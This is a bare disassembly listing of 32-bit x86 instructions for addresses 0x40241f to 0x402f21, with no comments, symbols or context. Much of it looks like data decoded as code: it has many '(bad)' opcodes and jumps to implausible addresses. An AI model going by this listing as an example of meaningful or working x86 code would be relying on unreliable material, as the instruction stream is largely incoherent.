  40241f:	add    cl,ch
  402421:	add    ecx,DWORD PTR ds:0xd03e900
  402427:	add    BYTE PTR [ecx-0x16fff2f8],cl
  40242d:	or     ebx,DWORD PTR [ebp+0x0]
  402430:	jmp    0xd5404140
  402435:	or     eax,DWORD PTR [eax]
	...
  402453:	add    BYTE PTR [esi],bh
  402455:	add    BYTE PTR [eax],al
  402457:	fist   DWORD PTR ds:0x16e90001
  40245d:	jo     0x40245f
  40245f:	jmp    0xe940546a
  402464:	add    eax,eax
  402466:	add    cl,bh
  402468:	adc    esi,esi
  40246a:	(bad)  
  40246b:	call   0xe9408486
  402470:	push   es
  402471:	and    BYTE PTR [eax],al
  402473:	jmp    0xe940c479
  402478:	push   ss
  402479:	add    BYTE PTR [eax],al
  40247b:	jmp    0xe940a496
  402480:	push   es
  402481:	inc    eax
  402482:	add    cl,ch
  402484:	add    eax,esp
  402486:	add    cl,bh
  402488:	adc    edi,edx
  40248a:	(bad)  
  40248b:	call   0xe9406ca6
  402490:	push   es
  402491:	or     BYTE PTR [eax],al
  402493:	jmp    0xda40b499
  402498:	adc    esp,DWORD PTR ds:0x6816e900
  40249e:	add    cl,ch
  4024a0:	push   es
  4024a1:	sub    BYTE PTR [eax],al
  4024a3:	jmp    0xf840f4a9
  4024a8:	adc    esi,ecx
  4024aa:	(bad)  
  4024ab:	call   0xe9408cc6
  4024b0:	push   es
  4024b1:	sub    BYTE PTR [eax],al
  4024b3:	jmp    0xe940b4b9
	...
  4024d4:	add    BYTE PTR [eax],al
  4024d6:	push   ss
  4024d7:	or     BYTE PTR [eax],al
  4024d9:	jmp    0xe940acf4
  4024de:	push   es
  4024df:	dec    eax
  4024e0:	add    cl,ch
  4024e2:	add    eax,edx
  4024e4:	add    cl,bh
  4024e6:	adc    eax,DWORD PTR [eax+eax*1]
  4024e9:	jmp    0x405904
  4024ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024ef:	or     edx,DWORD PTR [eax+eax*1]
  4024f2:	(bad)  [ebx]
  4024f4:	jecxz  0x4024f6
  4024f6:	mov    DWORD PTR [esi],0xbb4002b
  4024fc:	je     0x4024fe
  4024fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024ff:	or     esi,DWORD PTR [eax+eax*1]
  402502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402503:	or     al,0xc8
  402505:	add    BYTE PTR [ebp+0x74000d06],al
  40250b:	or     esp,DWORD PTR [eax+eax*1+0x64]
  40250f:	or     esp,DWORD PTR [eax+eax*1]
  402512:	fs or  al,0xa8
  402515:	add    BYTE PTR [ebx+ecx*1+0x4],dh
  402519:	add    BYTE PTR [ebx+ecx*1-0x7c],dh
  40251d:	add    BYTE PTR [ebx+ecx*1+0x44],ah
  402521:	add    BYTE PTR [esp+ecx*1-0x18],ah
  402525:	add    BYTE PTR [esi+eax*1+0x8],al
  402529:	add    BYTE PTR [ebx+ecx*1],dh
  40252c:	pop    esp
  40252d:	add    BYTE PTR [ebx+ecx*1],ah
  402530:	sbb    al,0x0
  402532:	and    al,0xc
  402534:	cwde   
  402535:	add    BYTE PTR [eax+0x6],cl
  402538:	push   ebx
	...
  402555:	add    BYTE PTR [eax],al
  402557:	add    BYTE PTR [ebx+ecx*1],dh
  40255a:	jl     0x40255c
  40255c:	and    al,0xb
  40255e:	cmp    al,0x0
  402560:	and    al,0xc
  402562:	fadd   DWORD PTR [eax]
  402564:	push   es
  402565:	push   es
  402566:	pop    ss
  402567:	add    ah,dh
  402569:	or     ch,BYTE PTR [eax+eax*1-0x1c]
  40256d:	or     ch,BYTE PTR [eax+eax*1]
  402570:	in     al,0xb
  402572:	mov    eax,0xc0af400
  402577:	add    ah,dh
  402579:	or     cl,BYTE PTR [eax+eax*1+0x4c0ae4]
  402580:	in     al,0xb
  402582:	clc    
  402583:	add    BYTE PTR ds:0xd0306d9,cl
  402589:	jmp    0xe94d7799
  40258e:	or     edx,DWORD PTR [edx]
  402590:	or     eax,0xda30bb4
  402595:	mov    edx,0xe90d2306
  40259a:	or     esi,DWORD PTR [edx+0xd]
  40259d:	jmp    0xe94d57ad
  4025a2:	or     al,ah
  4025a4:	or     eax,0xd0b04d8
  4025a9:	jmp    0xe94d87b9
  4025ae:	or     esp,DWORD PTR [edx]
  4025b0:	or     eax,0xda40ae9
  4025b5:	jmp    0xe94d27c5
  4025ba:	or     eax,DWORD PTR [edx+0x0]
	...
  4025d8:	add    BYTE PTR [eax],al
  4025da:	or     eax,0xd420be9
  4025df:	jmp    0xd94e09ee
  4025e4:	add    al,0x7
  4025e6:	or     eax,0xd5a0be9
  4025eb:	jmp    0xe94d3ffb
  4025f0:	or     dl,BYTE PTR [ebp+ecx*1+0xd4304bd]
  4025f7:	jmp    0xe94da007
  4025fc:	or     edi,DWORD PTR [edx]
  4025fe:	or     eax,0xdd40ae9
  402603:	fld    DWORD PTR [ebx+edx*1]
  402606:	or     eax,0xd6a0be7
  40260b:	out    0xb,eax
  40260d:	sub    cl,BYTE PTR ds:0xdb40ae7
  402613:	out    0xb,eax
  402615:	or     cl,BYTE PTR ds:0xd8a0be7
  40261b:	add    cl,ch
  40261d:	or     eax,DWORD PTR [edi+0x0]
  402620:	jmp    0xf940e72f
  402625:	add    al,0x8
  402627:	add    cl,ch
  402629:	or     esp,DWORD PTR [ebx+0x0]
  40262c:	jmp    0xa940413c
  402631:	or     ecx,DWORD PTR ds:0xde04da00
  402637:	(bad)  
  402638:	call   0xe9404948
  40263d:	or     eax,DWORD PTR [eax]
	...
  40265b:	add    bl,bl
  40265d:	(bad)  
  40265e:	call   0xf8407f6d
  402663:	add    al,0x12
  402665:	add    cl,ch
  402667:	or     esi,ebx
  402669:	(bad)  
  40266a:	call   0xe940517a
  40266f:	or     bh,BYTE PTR [ecx+0xb0be900]
  402675:	add    cl,ch
  402677:	or     edx,DWORD PTR [ebx-0x34f41700]
  40267d:	(bad)  
  40267e:	call   0xf9405f8d
  402683:	add    al,0x14
  402685:	add    cl,ch
  402687:	or     ebx,ebx
  402689:	(bad)  
  40268a:	call   0xe940399a
  40268f:	or     cl,BYTE PTR [ecx-0x51fb2300]
  402695:	(bad)  
  402696:	call   0xe93fc1a6
  40269b:	or     edx,ebx
  40269d:	(bad)  
  40269e:	call   0xfb400fad
  4026a3:	add    al,0x26
  4026a5:	add    cl,ch
  4026a7:	or     ebp,DWORD PTR [ebx+0x0]
  4026aa:	jmp    0xe94049ba
  4026af:	or     ch,BYTE PTR [ecx+0x16e8ffff]
  4026b5:	push   cs
  4026b6:	add    cl,ch
  4026b8:	push   es
  4026b9:	mov    es,WORD PTR [eax]
  4026bb:	jmp    0xe94074c6
	...
  4026dc:	add    BYTE PTR [eax],al
  4026de:	pop    ss
  4026df:	fadd   QWORD PTR [eax]
  4026e1:	mov    DWORD PTR [ecx],ecx
  4026e3:	add    BYTE PTR [eax],al
  4026e5:	jmp    0xe94055f0
  4026ea:	push   es
  4026eb:	out    dx,eax
  4026ec:	call   ebx
  4026ee:	push   ss
  4026ef:	add    DWORD PTR [eax],0xfffd09db
  4026f5:	call   0xe9407600
  4026fa:	push   es
  4026fb:	verw   cx
  4026fe:	sbb    edx,eax
  402700:	add    cl,bh
  402702:	(bad)  
  402704:	add    cl,ch
  402706:	push   es
  402707:	pop    edi
  402708:	add    cl,ch
  40270a:	push   es
  40270b:	pop    ds
  40270c:	add    cl,ch
  40270e:	sbb    DWORD PTR [edx-0xe91700],esp
  402714:	(bad)  
  402715:	call   0xe940a620
  40271a:	push   es
  40271b:	aas    
  40271c:	add    cl,ch
  40271e:	sbb    edx,esp
  402720:	add    cl,bh
  402722:	clts   
  402724:	add    cl,ch
  402726:	push   es
  402727:	aaa    
  402728:	add    cl,ch
  40272a:	push   es
  40272b:	idiv   edi
  40272d:	call   0xda40994b
  402732:	nop    DWORD PTR [eax]
  402735:	jmp    0xe9407e40
  40273a:	push   es
  40273b:	pop    ss
  40273c:	add    cl,ch
  40273e:	sbb    DWORD PTR [esi+0xf800],ebp
	...
  402760:	psllw  mm7,mm7
  402763:	call   0x40906e
  402768:	in     al,0x7
  40276a:	sub    DWORD PTR [eax],eax
  40276c:	hlt    
  40276d:	or     al,0xb2
  40276f:	add    ah,dh
  402771:	pop    es
  402772:	or     DWORD PTR [eax],eax
  402774:	in     al,0x7
  402776:	mov    DWORD PTR [eax],eax
  402778:	in     al,0x7
  40277a:	dec    ecx
  40277b:	add    BYTE PTR [esp+ecx*1-0x13bff0e],dh
  402782:	add    eax,DWORD PTR [eax]
  402784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402785:	pop    es
  402786:	push   ebp
  402787:	add    BYTE PTR [edi+eax*1+0x7c40015],ah
  40278e:	add    al,BYTE PTR [ecx]
  402790:	(bad)  
  402791:	(bad)  
  402792:	sub    al,BYTE PTR [eax]
  402794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402795:	pop    es
  402796:	jne    0x402798
  402798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402799:	pop    es
  40279a:	xor    eax,0xca0c7400
  40279f:	add    BYTE PTR [ebp+0x64000cfe],al
  4027a5:	pop    es
  4027a6:	add    BYTE PTR gs:[edi+eax*1+0x25],ah
  4027ab:	add    BYTE PTR [esp+ecx*1-0x56],dh
  4027af:	add    BYTE PTR [edi+eax*1+0x5],dh
  4027b3:	add    BYTE PTR [edi+eax*1-0x7b],ah
  4027b7:	add    BYTE PTR [edi+eax*1+0x45],ah
  4027bb:	add    BYTE PTR [esp+ecx*1],dh
  4027be:	jmp    0x0:0x7fe4400
	...
  4027e1:	add    BYTE PTR [edi+eax*1],ah
  4027e4:	pop    ebp
  4027e5:	add    BYTE PTR [edi+eax*1],ah
  4027e8:	sbb    eax,0x9a0c3400
  4027ed:	add    BYTE PTR [eax-0x2],al
  4027f0:	push   edx
  4027f1:	add    BYTE PTR [edi+eax*1],ah
  4027f4:	jge    0x4027f6
  4027f6:	and    al,0x7
  4027f8:	cmp    eax,0xda0bf400
  4027fd:	add    BYTE PTR ds:0xd1702d7,cl
  402803:	jmp    0xe94d9513
  402808:	or     ebp,DWORD PTR ds:0xba0ce90d
  40280e:	or     eax,0xd0d0be9
  402813:	jmp    0xe94db523
  402818:	or     ecx,DWORD PTR [ebp+0xd]
  40281b:	jmp    0xd94e222c
  402820:	add    al,BYTE PTR [ebx]
  402822:	or     eax,0xd530be9
  402827:	jmp    0xb44d3b37
  40282c:	or     eax,ebx
  40282e:	or     eax,0xd2302b6
  402833:	jmp    0xe94d9b43
  402838:	or     esi,DWORD PTR [ebx]
  40283a:	or     eax,0xdc60ae9
  40283f:	fadd   DWORD PTR [eax]
  402841:	or     ecx,DWORD PTR ds:0x630be9
	...
  402863:	add    BYTE PTR ds:0xd230be9,cl
  402869:	jmp    0xe94dce78
  40286e:	or     eax,DWORD PTR [ebx]
  402870:	or     eax,0xd830be9
  402875:	jmp    0xe94d6b85
  40287a:	or     ah,dh
  40287c:	or     eax,0xd0700d9
  402881:	jmp    0xe94d8391
  402886:	or     ebx,DWORD PTR [ebx]
  402888:	or     eax,0xd960ae9
  40288d:	mov    ebp,0xe90d4300
  402892:	or     edi,DWORD PTR [ebx+0xd]
  402895:	add    cl,ch
  402897:	or     eax,DWORD PTR [esi+0x0]
  40289a:	jmp    0xfb4103a9
  40289f:	add    BYTE PTR [esi],bl
  4028a1:	add    cl,ch
  4028a3:	or     esp,DWORD PTR [esi+0x0]
  4028a6:	jmp    0xe9405eb6
  4028ab:	or     bl,BYTE PTR [ebx+0x60be900]
  4028b1:	add    cl,ch
  4028b3:	or     eax,DWORD PTR [esi+0x560be900]
  4028b9:	add    cl,ch
  4028bb:	or     bh,BYTE PTR [ebx+0x1000f900]
  4028c1:	add    cl,ch
  4028c3:	or     ebx,DWORD PTR [edx+0x0]
  4028c6:	jmp    0x4028d6
	...
  4028e3:	add    BYTE PTR [eax],al
  4028e5:	add    BYTE PTR [edx],al
  4028e7:	add    BYTE PTR [ecx-0x25fff2f5],ch
  4028ed:	add    dh,bl
  4028ef:	(bad)  
  4028f0:	call   0xe9404300
  4028f5:	or     eax,DWORD PTR [edx+0x0]
  4028f8:	jmp    0xf8407c07
  4028fd:	add    BYTE PTR [edx],cl
  4028ff:	add    cl,ch
  402901:	or     ebp,edx
  402903:	(bad)  
  402904:	call   0xe9405b14
  402909:	or     dh,BYTE PTR [ebx+0x120be900]
  40290f:	add    cl,ch
  402911:	or     ecx,DWORD PTR [edx-0x2df41700]
  402917:	(bad)  
  402918:	call   0xf9405c27
  40291d:	add    BYTE PTR [eax+eax*1],al
  402920:	jmp    0xe93ffb30
  402925:	or     ecx,DWORD PTR [edx]
  402927:	add    cl,ch
  402929:	or     al,BYTE PTR [ebx+0xddd0000]
  40292f:	pop    ebp
  402930:	add    cl,ch
  402932:	push   es
  402933:	pop    ecx
  402934:	add    cl,ch
  402936:	push   ss
  402937:	sbb    DWORD PTR [eax],eax
  402939:	jmp    0xfb40e355
  40293e:	or     eax,0x6e8fff5
  402943:	imul   eax,DWORD PTR [eax],0x2916e9
  402949:	jmp    0x40294e
	...
  402966:	add    BYTE PTR [eax],al
  402968:	pop    ss
  402969:	call   0xe900:0x906e900
  402970:	push   es
  402971:	mov    DWORD PTR [eax],eax
  402973:	jmp    0xe940728e
  402978:	pop    ss
  402979:	fiadd  DWORD PTR [eax]
  40297b:	mov    DWORD PTR ds:0x6e90000,ecx
  402981:	xor    BYTE PTR [eax],al
  402983:	jmp    0xd540199e
  402988:	push   ss
  402989:	dec    ebp
  40298a:	add    bl,bl
  40298c:	or     eax,0x6e8fff9
  402991:	push   eax
  402992:	add    cl,ch
  402994:	push   ss
  402995:	adc    BYTE PTR [eax],al
  402997:	jmp    0xf940e8ad
  40299c:	jnp    0x4029a4
  40299e:	add    cl,ch
  4029a0:	push   es
  4029a1:	pusha  
  4029a2:	add    cl,ch
  4029a4:	push   ss
  4029a5:	and    BYTE PTR [eax],al
  4029a7:	jmp    0xe940c8bd
  4029ac:	push   es
  4029ad:	add    BYTE PTR [eax],al
  4029af:	jmp    0xe940a9ba
  4029b4:	push   ss
  4029b5:	inc    eax
  4029b6:	add    cl,ch
  4029b8:	adc    edi,ebx
  4029ba:	add    cl,bh
  4029bc:	cmp    eax,DWORD PTR [edx]
  4029be:	add    cl,ch
  4029c0:	push   es
  4029c1:	cmp    BYTE PTR [eax],al
  4029c3:	add    BYTE PTR [esp+eax*1],dh
  4029c6:	sbb    BYTE PTR [eax],al
  4029c8:	xor    al,0xb
  4029ca:	xchg   ecx,eax
	...
  4029e7:	add    BYTE PTR [eax],al
  4029e9:	add    BYTE PTR [edi],dh
  4029eb:	fnstcw WORD PTR [edx]
  4029ed:	add    BYTE PTR [esp+eax*1],ah
  4029f0:	js     0x4029f2
  4029f2:	hlt    
  4029f3:	or     edi,DWORD PTR [eax]
  4029f5:	add    ah,dh
  4029f7:	add    al,0xd1
  4029f9:	add    ch,dh
  4029fb:	(bad)  
  4029fc:	adc    BYTE PTR [eax],al
  4029fe:	in     al,0xb
  402a00:	push   0x280bf400
  402a05:	add    ah,dh
  402a07:	add    al,0xb1
  402a09:	add    ah,ah
  402a0b:	or     ecx,DWORD PTR [eax]
  402a0d:	add    ah,ah
  402a0f:	or     ecx,DWORD PTR [eax+0x480bb400]
  402a15:	add    BYTE PTR [esp+eax*1-0x294bff0f],dh
  402a1c:	add    eax,DWORD PTR [eax]
  402a1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a1f:	or     edx,DWORD PTR [eax+eax*1-0x4c]
  402a23:	or     edx,DWORD PTR [eax+eax*1]
  402a26:	mov    ecx,0xb700e30b
  402a2b:	(bad)  
  402a2c:	sub    al,BYTE PTR [eax]
  402a2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a2f:	or     esi,DWORD PTR [eax+eax*1+0x74]
  402a33:	or     esi,DWORD PTR [eax+eax*1]
  402a36:	je     0x402a3c
  402a38:	leave  
  402a39:	add    BYTE PTR [ebp-0x2a],dh
  402a3c:	or     al,0x0
  402a3e:	or     esp,DWORD PTR fs:[eax+eax*1+0x74]
  402a43:	or     esp,DWORD PTR [eax+eax*1]
  402a46:	je     0x402a4c
  402a48:	test   eax,0x40b6400
	...
  402a69:	add    BYTE PTR [eax],al
  402a6b:	add    BYTE PTR [ebx+ecx*1-0x7c],ah
  402a6f:	add    BYTE PTR [ebx+ecx*1],dh
  402a72:	inc    esp
  402a73:	add    BYTE PTR [esp+eax*1],dh
  402a76:	jmp    0xff19377b
  402a7b:	pop    es
  402a7c:	or     eax,0xd5c0be9
  402a81:	jmp    0xe94d4691
  402a86:	or     al,0x99
  402a88:	or     eax,0xd52feb5
  402a8d:	jmp    0xe94da69d
  402a92:	or     edi,DWORD PTR [ecx*1+0xdd90ce9]
  402a99:	(bad)  
  402a9b:	push   ss
  402a9c:	or     eax,0xd6c0be9
  402aa1:	jmp    0xe94d56b1
  402aa6:	or     al,0xb9
  402aa8:	or     eax,0xd0c0be9
  402aad:	jmp    0xe94db6bd
  402ab2:	or     ecx,DWORD PTR [ebp+ecx*1-0x17]
  402ab6:	or     al,0xf9
  402ab8:	or     eax,0xd02fed9
  402abd:	jmp    0xe94d7ccd
  402ac2:	or     edx,DWORD PTR [edx]
  402ac4:	or     eax,0xda30bac
  402ac9:	mov    edx,0xe90d22fe
  402ace:	or     esi,DWORD PTR [edx+0x0]
	...
  402aed:	add    BYTE PTR ds:0xd320be9,cl
  402af3:	jmp    0xd84df002
  402af8:	cld    
  402af9:	or     cl,BYTE PTR ds:0xd620be9
  402aff:	jmp    0xe94d4d0f
  402b04:	or     ah,BYTE PTR [ebp+0x20be90d]
  402b0a:	or     eax,0xd820be9
  402b0f:	add    cl,ch
  402b11:	or     ecx,edi
  402b13:	(bad)  
  402b14:	call   0xf93f5b23
  402b19:	cld    
  402b1a:	or     eax,DWORD PTR [eax]
  402b1c:	jmp    0xe93ff22c
  402b21:	or     eax,DWORD PTR [edi]
  402b23:	add    cl,ch
  402b25:	or     al,BYTE PTR [eax-0x30032301]
  402b2b:	(bad)  
  402b2c:	call   0xe940b23c
  402b31:	or     eax,DWORD PTR [edi+0x0]
  402b34:	jmp    0xfb410b43
  402b39:	cld    
  402b3a:	pop    ds
  402b3b:	add    cl,ch
  402b3d:	or     esi,DWORD PTR [edi+0x0]
  402b40:	jmp    0xe9406250
  402b45:	or     ah,BYTE PTR [eax+0x70be900]
  402b4b:	add    cl,ch
  402b4d:	or     edx,DWORD PTR [edi+0xbe900]
	...
  402b6f:	add    BYTE PTR [edi+0x0],dl
  402b72:	jmp    0xf940eb81
  402b77:	cld    
  402b78:	or     DWORD PTR [eax],eax
  402b7a:	jmp    0xe9406e8a
  402b7f:	or     edi,ebx
  402b81:	jmp    FWORD PTR [eax-0x25fff2f5]
  402b87:	cld    
  402b88:	(bad)  
  402b8a:	call   0xe9402e9a
  402b8f:	or     edi,DWORD PTR [ebx]
  402b91:	add    cl,ch
  402b93:	or     cl,BYTE PTR [eax+0x0]
  402b96:	clc    
  402b97:	cld    
  402b98:	add    eax,DWORD PTR [eax]
  402b9a:	jmp    0xe9401eaa
  402b9f:	or     ebp,DWORD PTR [ebx]
  402ba1:	add    cl,ch
  402ba3:	or     ch,BYTE PTR [eax+0x6e90000]
  402ba9:	(bad)  
  402baa:	(bad)  
  402bab:	call   0xe940a9c6
  402bb0:	push   ss
  402bb1:	ds add cl,ch
  402bb4:	pop    es
  402bb5:	jecxz  0x402bb7
  402bb7:	stc    
  402bb8:	xor    DWORD PTR [eax],ecx
  402bba:	add    cl,ch
  402bbc:	push   ss
  402bbd:	ss add cl,ch
  402bc0:	push   ss
  402bc1:	idiv   bh
  402bc3:	call   0xdd409ecf
  402bc8:	adc    DWORD PTR [edx+0x0],esp
  402bcb:	jmp    0xe94081e6
  402bd0:	push   ss
  402bd1:	push   ss
  402bd2:	add    cl,ch
	...
  402bf0:	add    BYTE PTR [eax],al
  402bf2:	pop    es
  402bf3:	mov    bl,0x0
  402bf5:	sti    
  402bf6:	icebp  
  402bf7:	stc    
  402bf8:	(bad)  
  402bf9:	call   0xe9409214
  402bfe:	push   ss
  402bff:	es add cl,ch
  402c02:	pop    es
  402c03:	xchg   ebx,eax
  402c04:	add    cl,ch
  402c06:	push   es
  402c07:	push   es
  402c08:	add    cl,ch
  402c0a:	push   ss
  402c0b:	xchg   BYTE PTR [eax],al
  402c0d:	jmp    0xe9407228
  402c12:	pop    es
  402c13:	rol    DWORD PTR [eax],cl
  402c15:	mov    DWORD PTR [ecx+0x16e9ffd4],esi
  402c1b:	das    
  402c1c:	add    cl,ch
  402c1e:	push   ss
  402c1f:	out    dx,eax
  402c20:	call   ebx
  402c22:	push   es
  402c23:	add    DWORD PTR [eax],0xfff591db
  402c29:	call   0xe9407b44
  402c2e:	xchg   BYTE PTR [edi],cl
  402c30:	add    cl,ch
  402c32:	jns    0x402bf5
  402c34:	add    cl,bh
  402c36:	pop    es
  402c37:	or     al,BYTE PTR [eax]
  402c39:	jmp    0x408ba4
  402c3e:	je     0x402c18
  402c40:	and    BYTE PTR [eax],al
  402c42:	shl    DWORD PTR fs:[edx+0xd86400],cl
  402c49:	add    BYTE PTR [eax+ebx*8],dh
  402c4c:	add    BYTE PTR [eax],0x34
  402c4f:	fadd   DWORD PTR [eax+0x0]
  402c52:	and    al,0xd3
  402c54:	loop   0x402c56
	...
  402c72:	add    BYTE PTR [eax],al
  402c74:	xor    al,0x9
  402c76:	push   es
  402c77:	add    BYTE PTR [eax+ebx*8],dh
  402c7a:	pop    eax
  402c7b:	add    BYTE PTR [eax+ebx*8],dh
  402c7e:	sbb    BYTE PTR [eax],al
  402c80:	and    al,0xd3
  402c82:	xchg   edx,eax
  402c83:	add    BYTE PTR [edi],dh
  402c85:	or     DWORD PTR [ebx],edi
  402c87:	add    ah,dh
  402c89:	xlat   BYTE PTR ds:[ebx]
  402c8a:	js     0x402c8c
  402c8c:	hlt    
  402c8d:	xlat   BYTE PTR ds:[ebx]
  402c8e:	cmp    BYTE PTR [eax],al
  402c90:	in     al,0xd4
  402c92:	rol    BYTE PTR [eax],cl
  402c94:	cmc    
  402c95:	push   es
  402c96:	adc    DWORD PTR [eax],eax
  402c98:	hlt    
  402c99:	xlat   BYTE PTR ds:[ebx]
  402c9a:	push   0x28d7f400
  402c9f:	add    ah,ah
  402ca1:	aam    0xb2
  402ca3:	add    ah,ah
  402ca5:	xlat   BYTE PTR ds:[ebx]
  402ca6:	or     BYTE PTR [eax],al
  402ca8:	mov    ah,0xd7
  402caa:	mov    BYTE PTR [eax],al
  402cac:	mov    ah,0xd7
  402cae:	dec    eax
  402caf:	add    BYTE PTR [esp+edx*8+0x6b400f2],ah
  402cb6:	add    al,0x0
  402cb8:	mov    ah,0xd7
  402cba:	push   esp
  402cbb:	add    BYTE PTR [edi+edx*8-0x284bffec],dh
  402cc2:	add    DWORD PTR [ecx],eax
  402cc4:	mov    bh,0x6
  402cc6:	sub    eax,DWORD PTR [eax]
  402cc8:	je     0x402ca1
  402cca:	je     0x402ccc
  402ccc:	je     0x402ca5
  402cce:	xor    al,0x0
  402cd0:	fs aam 0xca
  402cd3:	add    BYTE PTR ds:0xd0ad8,cl
	...
  402cf5:	add    BYTE PTR ds:0xd64fbe9,cl
  402cfb:	jmp    0xe94d51fb
  402d00:	cld    
  402d01:	stos   BYTE PTR es:[edi],al
  402d02:	or     eax,0xd04fbe9
  402d07:	jmp    0xe94db207
  402d0c:	sti    
  402d0d:	inc    esp
  402d0e:	or     eax,0xdeafce9
  402d13:	(bad)  [edx]
  402d15:	or     BYTE PTR ds:0xd5cfbe9,cl
  402d1b:	jmp    0xe94d4a1b
  402d20:	cld    
  402d21:	call   0xe90d:0x530ab50d
  402d28:	sti    
  402d29:	jl     0x402d38
  402d2b:	jmp    0xe94d6a2b
  402d30:	cld    
  402d31:	fimul  DWORD PTR ds:0xd170ad7
  402d37:	jmp    0xe94d9a37
  402d3c:	sti    
  402d3d:	sub    al,0xd
  402d3f:	jmp    0xe94de840
  402d44:	sti    
  402d45:	or     al,0xd
  402d47:	jmp    0xe94dba47
  402d4c:	sti    
  402d4d:	dec    esp
  402d4e:	or     eax,0xdfafce9
  402d53:	(bad)  [edx]
  402d55:	add    ecx,DWORD PTR ds:0x52fbe9
	...
  402d77:	add    BYTE PTR ds:0xd12fbe9,cl
  402d7d:	lods   al,BYTE PTR ds:[esi]
  402d7e:	sti    
  402d7f:	ret    0xb60d
  402d82:	or     ah,BYTE PTR [ebx]
  402d84:	or     eax,0xd72fbe9
  402d89:	add    cl,ch
  402d8b:	sti    
  402d8c:	aas    
  402d8d:	add    cl,ch
  402d8f:	cli    
  402d90:	dec    ebx
  402d91:	push   edi
  402d93:	or     BYTE PTR [esi],dl
  402d95:	add    cl,ch
  402d97:	sti    
  402d98:	out    dx,eax
  402d99:	(bad)  
  402d9a:	call   0xe9405d9a
  402d9f:	cli    
  402da0:	stos   DWORD PTR es:[edi],eax
  402da1:	(bad)  
  402da2:	call   0xe9403da2
  402da7:	sti    
  402da8:	(bad)  
  402da9:	(bad)  
  402daa:	call   0xe93ffdaa
  402daf:	cli    
  402db0:	sub    edi,edi
  402db2:	clc    
  402db3:	or     BYTE PTR [edx],dl
  402db5:	add    cl,ch
  402db7:	sti    
  402db8:	(bad)  
  402db9:	(bad)  
  402dba:	call   0xe94025ba
  402dbf:	cli    
  402dc0:	jnp    0x402dc1
  402dc2:	fmul   QWORD PTR [eax]
  402dc4:	dec    esi
  402dc5:	add    cl,ch
  402dc7:	sti    
  402dc8:	xchg   DWORD PTR [eax],eax
  402dca:	jmp    0xe94065ca
  402dcf:	cli    
  402dd0:	fild   DWORD PTR [eax]
  402dd2:	sti    
  402dd3:	or     dh,bh
  402dd5:	(bad)  
  402dd6:	call   0xe940a5d6
  402ddb:	sti    
	...
  402df8:	add    BYTE PTR [eax],al
  402dfa:	daa    
  402dfb:	add    cl,ch
  402dfd:	cli    
  402dfe:	fwait
  402dff:	add    cl,ch
  402e01:	sti    
  402e02:	pop    ss
  402e03:	add    cl,ch
  402e05:	sti    
  402e06:	xchg   edi,eax
  402e07:	add    cl,ch
  402e09:	sti    
  402e0a:	inc    edi
  402e0b:	add    cl,ch
  402e0d:	cli    
  402e0e:	mov    ebx,0x1008f900
  402e13:	add    cl,ch
  402e15:	sti    
  402e16:	cmp    eax,DWORD PTR [eax]
  402e18:	jmp    0xa9403218
  402e1d:	sti    
  402e1e:	xchg   edx,eax
  402e1f:	rol    DWORD PTR [eax],1
  402e21:	ficom  DWORD PTR ds:0x86e9000d
  402e27:	dec    edx
  402e28:	add    cl,ch
  402e2a:	jbe    0x402e36
  402e2c:	add    cl,ch
  402e2e:	ja     0x402df2
  402e30:	add    al,bh
  402e32:	adc    eax,0x66e90001
  402e37:	pop    edx
  402e38:	add    cl,ch
  402e3a:	push   esi
  402e3b:	sbb    al,BYTE PTR [eax]
  402e3d:	jmp    0xe940d099
  402e42:	inc    esi
  402e43:	cli    
  402e44:	(bad)  
  402e45:	call   0xe940a890
  402e4a:	cmp    al,BYTE PTR ss:[eax]
  402e4d:	jmp    0xf9411089
  402e52:	adc    eax,0x26e90007
  402e57:	xor    al,BYTE PTR [eax]
  402e59:	jmp    0xe9402074
	...
  402e7a:	add    BYTE PTR [eax],al
  402e7c:	pop    ss
  402e7d:	jb     0x402e7f
  402e7f:	fst    QWORD PTR ds:0x6e9005d
  402e85:	push   edx
  402e86:	add    cl,ch
  402e88:	not    BYTE PTR [ecx]
  402e8a:	add    cl,ch
  402e8c:	div    DWORD PTR [ecx-0xaea0500]
  402e92:	(bad)  
  402e93:	call   0xe940907e
  402e98:	(bad)  
  402e99:	and    DWORD PTR [eax],eax
  402e9b:	jmp    0xe940c077
  402ea0:	mov    BYTE PTR [ecx],0x0
  402ea3:	jmp    0xe940b06e
  402ea8:	mov    dh,0x41
  402eaa:	add    cl,ch
  402eac:	mov    bh,0xd1
  402eae:	add    cl,bh
  402eb0:	adc    edi,edi
  402eb2:	push   ebp
  402eb4:	or     edi,edi
  402eb6:	add    BYTE PTR [eax],al
  402eb8:	mov    bh,0xf9
  402eba:	adc    BYTE PTR [eax],al
  402ebc:	scas   eax,DWORD PTR es:[edi]
  402ebd:	stc    
  402ebe:	add    BYTE PTR [eax],dl
  402ec0:	gs stc 
  402ec2:	add    al,0x0
  402ec4:	pop    ebp
  402ec5:	stc    
  402ec6:	add    BYTE PTR [ecx+edi*2],al
  402ec9:	pop    es
  402eca:	inc    ecx
  402ecb:	add    BYTE PTR [ecx+0x7],dh
  402ece:	add    DWORD PTR [eax+0x64],eax
  402ed1:	pop    es
  402ed2:	add    eax,DWORD PTR [eax]
  402ed4:	pop    esp
  402ed5:	pop    es
  402ed6:	add    DWORD PTR [edx],eax
  402ed8:	cmp    BYTE PTR [edi],al
  402eda:	and    DWORD PTR [eax],eax
  402edc:	xor    BYTE PTR [edi],al
  402ede:	add    DWORD PTR [eax],esp
	...
  402efc:	add    BYTE PTR [eax],al
  402efe:	popw   es
  402f00:	or     DWORD PTR [eax],eax
  402f02:	pop    esi
  402f03:	pop    es
  402f04:	add    DWORD PTR [eax],ecx
  402f06:	cmp    al,BYTE PTR [edi]
  402f08:	add    DWORD PTR [eax],0x6e4
  402f0e:	and    al,0x7
  402f10:	add    al,BYTE PTR [eax]
  402f12:	sbb    eax,DWORD PTR [edi]
  402f14:	add    DWORD PTR [ecx],0x190737
  402f1a:	das    
  402f1b:	pop    es
  402f1c:	add    DWORD PTR [eax],ebx
  402f1e:	in     eax,0xf8
  402f20:	push   es
  402f21:	add    ch,bl
